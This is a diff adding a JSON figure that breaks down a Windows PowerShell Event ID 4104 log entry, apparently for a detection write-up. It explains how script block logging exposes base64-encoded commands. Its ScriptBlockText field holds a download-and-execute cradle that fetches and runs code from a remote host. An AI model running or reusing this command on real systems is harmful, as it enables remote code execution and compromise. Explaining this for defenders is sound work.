@@ -1,0 +1,20 @@
+{
+  "title": "Event ID 4104 — Decoded PowerShell script block for the encoded launch",
+  "event_type": "Microsoft-Windows-PowerShell/Operational channel, EventID 4104 (Creating Scriptblock text)",
+  "fields": [
+    {"label": "EventID", "value": "4104"},
+    {"label": "Channel", "value": "Microsoft-Windows-PowerShell/Operational"},
+    {"label": "TimeCreated", "value": "2026-09-15T14:22:07.341Z"},
+    {"label": "Computer", "value": "WKSTN-0417.corp.local"},
+    {"label": "Path", "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
+    {"label": "ScriptBlockId", "value": "a3f1c9de-7b2e-4e6a-9d0f-8812c4e6a901"},
+    {"label": "MessageNumber / MessageTotal", "value": "1 / 1"},
+    {"label": "ScriptBlockText", "value": "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a')"}
+  ],
+  "callouts": [
+    {"number": 1, "field_label": "ScriptBlockText", "explanation": "This is the plaintext script after PowerShell's own engine base64-decoded the -enc argument — the obfuscation that defeats a raw command-line string match does not survive this hop, which is the specific claim this figure supports."},
+    {"number": 2, "field_label": "EventID / Channel", "explanation": "4104 only exists in this channel if script block logging was explicitly enabled via GPO; without that setting this event never fires and the field above never appears in any log."},
+    {"number": 3, "field_label": "ScriptBlockId", "explanation": "Correlates this decoded block back to the originating process and, when a script is split across multiple 4104 events, ties fragments together via MessageNumber/MessageTotal."}
+  ],
+  "note": "Illustrative/conceptual field breakdown of what a 4104 entry would contain for this scenario; not a captured screenshot or product interface, and not generated from a real lab run."
+}
